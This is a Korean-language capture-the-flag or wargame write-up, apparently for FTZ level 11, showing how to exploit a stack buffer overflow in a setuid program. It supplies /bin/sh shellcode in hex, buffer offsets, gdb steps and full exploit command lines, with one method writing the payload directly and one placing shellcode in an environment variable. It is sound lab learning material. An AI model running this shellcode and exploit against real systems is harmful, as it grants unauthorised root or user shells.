레벨 11

메모리 구조

*** 버퍼(256바이트) + 더미(8바이트) + SFP(4바이트) + RET(4바이트) = 272바이트

따라서 25바이트 쉘코드를 사용

- 25바이트 코드 일반적인 쉘코드

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80

- 48바이트 코드 쉘코드

\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80




BOF의 기초가 되는 Return Address 조작

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

버퍼 오버플로우에 대하여.

>>

버퍼 오버플로우(BOF) 는 허용되어있는 버퍼보다 더 큰 버퍼가 들어가는 경우를
말한다.


버퍼가 넘칠떄 버퍼에 데이터를 원하는 코드를 넣어 쓸수있다. 이렇게 하려면
조건은 정확한 return address 가 저장되는 곳을 찾아야한다.




RET(돌아올주소) 값을 덮어쓰기 위해 아래와 같은 명령어 입력해야합니다.



--------------------------------------------------------------------------------------------

다시 문제 11번

cat hint 를 입력했을때

#include <stdio.h>
#include <stdlib.h>

int main( int argc, char *argv[] )
{
        char str[256];

        setreuid( 3092, 3092 );
        strcpy( str, argv[1] );
        printf( str );
}

가 나오는데 이말은 str에 256이란 버퍼를 제한했고 


0x08048499		264 바이트


0x080484a0		>> 입력

0x080484ab		264 바이트


0x08048470  main		함수 주소


@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

환경변수 등록 >> export 만들 환경변수 이름=$(python -c 'print "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"')
(45바이트 쉘코드로 환경변수를 등록)

해당 프로그램을 gdb로 디어셈블리 해서 시작 주소를 알아낸다 . 
ex) 256바이트를 할당했지만 실제로는 264바이트를 할당했고 8바이트는 쓰레기 값 따라서 총 272바이트에서 
ret 주소 값 4바이트를 빼주면 268바이트가 시작 주소이다.

(그리고 tmp 폴더에서 ret 주소값을 알아내는 소스코드를 작성한다.

#include<stdio.h>

int main()
{
	print("%p\n", getenv("내가 만든 환경변수 이름"));
	return 0
}

를 작성한다. 그리고 

gcc -o 만들 파일 만든 파일.c  를 입력해 컴파일을 해 컴파일한 파일을 실행해 주소값을 알아낸다.

그리고 최종적으로 ./실행할파일 `python -c 'print "A"*거리+"해당주소"'` 를 입력하면 가고자 하는 쉘로 접속이 된다.



만약에 앞에 A대신 \x90을 넣는경우가 있는데

이유는 앞에 NOP 코드를 넣는 이유는 혹시라도 주소값이 달라지더라도 NOP슬라이딩으로 쉘코드에 접근 할수 있게끔한다.

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

해체했을때

16진수로	108 바이트와 8바이트의 쓰레기값이 들어있음

총 264 + 8  = 272


25바이트 쉘코드 제외 ret 코드 4바이트 제외 243바이트를 nop코드로 채워서
버퍼 오버플로우 일으키기

gdb -q 파일이름 입력

b*main 으로 브레이크 포인트 걸어주고

r `python -c 'print "A"*256'` 을 넣어준다.
그리고 x/1000x $esp 를 통해서 주소를 알아낸다

우리 주소를 0xbffffb4c 으로 결정하자

그리고 우리는 총 272의 바이트를 가지고있고 이중에서 25 코드 쉘을 쓰기떄문에

272 - 25 = 247 바이트 인데 여기서 ret 주소의 칸 4바이트를 제외하면

272 - 4 = 243 이다. 따라서 243 바이트를 채워넣고 그 뒤에 주소를 쉘코드를 넣어주면
쉘을 획득할수있다.
  
ex)

 ./attackme `python -c 'print "A"*243+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x4c\xfb\xff\xbf"'`

입력하면 
sh-2.05b$ 이라는 쉘로 접속이 된다.



@@@@@@@@@@@###!$!!@#!@#결론@@@@@@@@@@@###!$!!@#!@#


##1##

첫번째는 level 11을 오버플로우로 구하는 방법이 2가지가 있는데

첫번째는 권한이 걸려있는 파일을 복사해서 gbd -q로 디어셈블을 해서 어떻게 메모리가 구성되어있는지 확인하고
b*main 명령을 입력후  소스코드는 256버퍼를 할당했기에 A를 256만큼 넣어준다. 

그리고 x/1000x $esp 를 입력해서 A가 들어가는곳을 찾아 그곳중 한곳을 적당히 주소로 잡는다.

그리고 어떻게 메모리가 구성되어있는지 확인한다.  보면 108 에 8인데 108은 264바이트이고 8은 8바이트이기에 총 272바이트

리던 주소 값 4바이트를 제외하면 268바이트 이다. 따라서 중간 25바이트 쉘코드를 입력하는 값을 제외하면 243바이트 이기에

./파일이름 `python -c 'print "A"*243+"쉘코드"+"적당히잡은주소"'` 를 입력하게되면 쉘을 획득하게 된다.



##2##

두번쨰는 환경변수를 이용하는 방법인데 환경변수에 48바이트 쉘코드를 이용해서
export 만들 환경변수 이름=$(python -c 'print "48바이트 쉘코드"')

를 입력하고 export로 입력이 되었는지 확인한다.

그리고 tmp 디렉터리에서 env.c라는 파일을 하나만드는데 주소를 알기위해서 간단한 소스코드를 하나 작성한다.

int main(){
	printf("%p\n", getenv("만든환경변수"));
	return 0;
}

를 입력해주고 저장한다. 그후 gcc -o 만들파일이름 파일이름.c 를 입력해 컴파일을 해주고
컴파일을한 파일을 실행해주면 주소값이 나온다.

그리고 본래 setuid 권한이있는 파일을 다시 실행시켜 버퍼오버플로우를 해주면된다.

그리고 또 gdb를 실행하여 ret을 제외한 268바이트가 시작주소라는것을 알아야한다.

따라서 	./파일이름 `python -c 'print "A"*268+"컴파일으로 구한주소"'`를 입력하면 쉘을 획득할수있다.


